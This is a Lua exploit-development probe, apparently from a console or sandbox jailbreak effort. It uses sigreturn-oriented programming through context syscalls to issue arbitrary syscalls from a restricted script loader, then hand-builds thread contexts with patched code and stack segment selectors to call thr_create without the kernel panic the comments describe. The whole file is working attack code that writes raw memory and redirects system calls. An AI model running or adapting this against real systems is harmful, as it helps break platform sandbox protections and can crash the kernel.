-- CRASH_CLASS: RISKY
-- PROBE 133a: thr_create with CS=0x43/SS=0x3B fix via SROP
--
-- CRITICAL TEST: thr_create(430) panics kernel because set_mcontext()
-- copies CS=0 from zeroed context without forcing SEL_RPL_MASK.
-- Fix: set CS=0x43 (user code 64-bit), SS=0x3B (user data).
-- If this works, we have THREADS on 14.10!
--
-- The new thread will immediately call thr_exit(431) to terminate
-- cleanly without crashing.
--
-- Risk: If the CS fix doesn't prevent the panic, kernel crashes.

print("=== PROBE 133a: THR_CREATE CS FIX ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("syscall_addr=" .. hex(sc_addr))

-- Capture current register state for reference
local cur_cs = memory.read_qword(ctx + MC + 0xA8)
local cur_ss = memory.read_qword(ctx + MC + 0xC0)
local cur_rflags = memory.read_qword(ctx + MC + 0xB0)
local cur_rsp = memory.read_qword(ctx + MC + 0xB8)
print("current CS=" .. hex(cur_cs) .. " SS=" .. hex(cur_ss))
print("current RFLAGS=" .. hex(cur_rflags) .. " RSP=" .. hex(cur_rsp))

local function srop(num, a1, a2, a3)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- Build thread ucontext with proper CS/SS
--------------------------------------------------------------------
print("")
print("--- Building thread context ---")

-- Allocate thread context
local thr_ctx = gpu + 0x1000
-- Zero it properly
for off = 0, 0x4FF, 4 do
    memory.write_dword(thr_ctx + off, 0)
end

-- Allocate thread stack (4 pages)
local thr_stack = gpu + 0x2000
local thr_stack_top = thr_stack + 0x3FF0  -- stack grows down

-- Thread ID output
local thr_id = gpu + 0x6000
memory.write_qword(thr_id, uint64(0))

-- Fill in the mcontext for the thread
-- The thread will execute: syscall with RAX=431 (thr_exit), RDI=0
-- This immediately exits the thread cleanly

-- Set uc_mcontext fields (mcontext starts at thr_ctx + 0x40)
local T = thr_ctx + MC

-- RIP = syscall instruction address
memory.write_qword(T + 0xA0, sc_addr)
print("thread RIP=" .. hex(sc_addr))

-- RAX = 431 (thr_exit syscall number)
memory.write_qword(T + 0x38, uint64(431))

-- RDI = 0 (exit status)
memory.write_qword(T + 0x08, uint64(0))

-- RSP = top of thread stack
memory.write_qword(T + 0xB8, uint64(string.format("0x%X", to_num(thr_stack_top))))
print("thread RSP=" .. hex(memory.read_qword(T + 0xB8)))

-- CS = 0x43 (user mode 64-bit code segment) — THE FIX
memory.write_qword(T + 0xA8, uint64(0x43))
print("thread CS=" .. hex(memory.read_qword(T + 0xA8)))

-- SS = 0x3B (user mode data segment) at mc_ss = MC+0xC0
memory.write_qword(T + 0xC0, uint64(0x3B))
print("thread SS=" .. hex(memory.read_qword(T + 0xC0)))

-- RFLAGS = 0x202 (IF set, reserved bit 1 set) at mc_rflags = MC+0xB0
memory.write_qword(T + 0xB0, uint64(0x202))
print("thread RFLAGS=" .. hex(memory.read_qword(T + 0xB0)))

-- mc_len at MC+0xC8
memory.write_qword(T + 0xC8, uint64(0x480))

-- Set uc_sigmask to block all signals (prevent signal-based crashes)
-- uc_sigmask is at thr_ctx + 0x04 (4 x uint32 = 16 bytes)
memory.write_dword(thr_ctx + 0x04, 0xFFFFFFFF)
memory.write_dword(thr_ctx + 0x08, 0xFFFFFFFF)
memory.write_dword(thr_ctx + 0x0C, 0xFFFFFFFF)
memory.write_dword(thr_ctx + 0x10, 0xFFFFFFFF)

-- uc_flags should indicate mcontext is valid
-- UCF_HAS_MCONTEXT = 0x01
memory.write_dword(thr_ctx, 0x01)

-- Put a return address on the thread stack (in case the thread doesn't
-- exit via syscall but tries to return from the function)
-- Use the syscall address again — it would loop, but that's fine
memory.write_qword(thr_stack_top, sc_addr)

--------------------------------------------------------------------
-- SECTION A: Call thr_create(430) via SROP
--------------------------------------------------------------------
print("")
print("--- [A] thr_create ---")
print("[A] FIRING thr_create(430)...")
print("[A] ctx=" .. hex(uint64(string.format("0x%X", to_num(thr_ctx)))))
print("[A] id_ptr=" .. hex(uint64(string.format("0x%X", to_num(thr_id)))))

-- thr_create(ucontext_t *ctx, long *id, int flags)
-- flags = 0
local thr_ctx_addr = uint64(string.format("0x%X", to_num(thr_ctx)))
local thr_id_addr = uint64(string.format("0x%X", to_num(thr_id)))
local rv_thr = srop(430, thr_ctx_addr, thr_id_addr, uint64(0))
print("[A] thr_create rv=" .. hex(rv_thr))

-- If we're still alive, the kernel didn't panic!
local alive_pid = to_num(sc20())
print("[A] *** STILL ALIVE! pid=" .. alive_pid .. " ***")

-- Check the thread ID
local tid = memory.read_qword(thr_id)
print("[A] thread ID=" .. hex(tid))

local rvh, rvl = get_hi_lo(rv_thr)
if rvl == 0 and rvh == 0 then
    print("[A] ******* THR_CREATE SUCCEEDED! *******")
    print("[A] ******* THREADS WORK ON 14.10! *******")

    -- Wait a moment for thread to exit
    -- Can't sleep, so just do some work
    local dummy = 0
    for i = 1, 10000 do dummy = dummy + 1 end

    -- Check if thread is still alive via thr_kill(433)
    local tid_val = to_num(tid)
    if tid_val > 0 then
        local rv_tk = srop(433, uint64(tid_val), uint64(0))
        print("[A] thr_kill(tid,0)=" .. hex(rv_tk) .. " (0=alive, -1=dead)")
    end
else
    print("[A] thr_create failed, rv=" .. hex(rv_thr))
end

--------------------------------------------------------------------
-- SECTION B: Try thr_create with thread that writes to shared memory
--------------------------------------------------------------------
print("")
print("--- [B] thr_create with shared write ---")

if rvl == 0 and rvh == 0 then
    -- Thread creation worked! Now try a thread that writes a marker
    -- before exiting

    -- This is tricky because we can't have arbitrary code execution (W^X).
    -- The thread can only start at the syscall instruction.
    -- So it will always immediately execute whatever syscall RAX holds.

    -- Use RAX=20 (getpid) — thread does getpid then... what?
    -- After syscall, RIP advances by 2 bytes (past the syscall instruction).
    -- The next instruction after the syscall in the loader's dispatch
    -- function is a comparison/branch. The thread would execute that
    -- and eventually return... but where? The thread has no valid
    -- return address context.

    -- Actually, let's just create another thread with thr_exit
    -- to confirm reproducibility

    local thr_ctx2 = gpu + 0x7000
    for off = 0, 0x4FF, 4 do
        memory.write_dword(thr_ctx2 + off, 0)
    end
    local thr_id2 = gpu + 0x8000
    memory.write_qword(thr_id2, uint64(0))

    local T2 = thr_ctx2 + MC
    memory.write_qword(T2 + 0xA0, sc_addr)   -- RIP
    memory.write_qword(T2 + 0x38, uint64(431)) -- RAX = thr_exit
    memory.write_qword(T2 + 0x08, uint64(0))   -- RDI = 0
    memory.write_qword(T2 + 0xB8, uint64(string.format("0x%X", to_num(thr_stack_top - 0x1000))))
    memory.write_qword(T2 + 0xA8, uint64(0x43))  -- CS
    memory.write_qword(T2 + 0xC0, uint64(0x3B)) -- SS at MC+0xC0
    memory.write_qword(T2 + 0xB0, uint64(0x202)) -- RFLAGS
    memory.write_qword(T2 + 0xC8, uint64(0x480)) -- mc_len at MC+0xC8
    memory.write_dword(thr_ctx2, 0x01)  -- uc_flags
    memory.write_dword(thr_ctx2 + 0x04, 0xFFFFFFFF) -- sigmask
    memory.write_dword(thr_ctx2 + 0x08, 0xFFFFFFFF)
    memory.write_dword(thr_ctx2 + 0x0C, 0xFFFFFFFF)
    memory.write_dword(thr_ctx2 + 0x10, 0xFFFFFFFF)

    local ctx2_addr = uint64(string.format("0x%X", to_num(thr_ctx2)))
    local id2_addr = uint64(string.format("0x%X", to_num(thr_id2)))
    local rv2 = srop(430, ctx2_addr, id2_addr, uint64(0))
    print("[B] thr_create #2 rv=" .. hex(rv2))
    print("[B] thread ID #2=" .. hex(memory.read_qword(thr_id2)))
    print("[B] pid=" .. to_num(sc20()))
end

print("")
print("=== PROBE 133a COMPLETE ===")
print("pid=" .. to_num(sc20()))
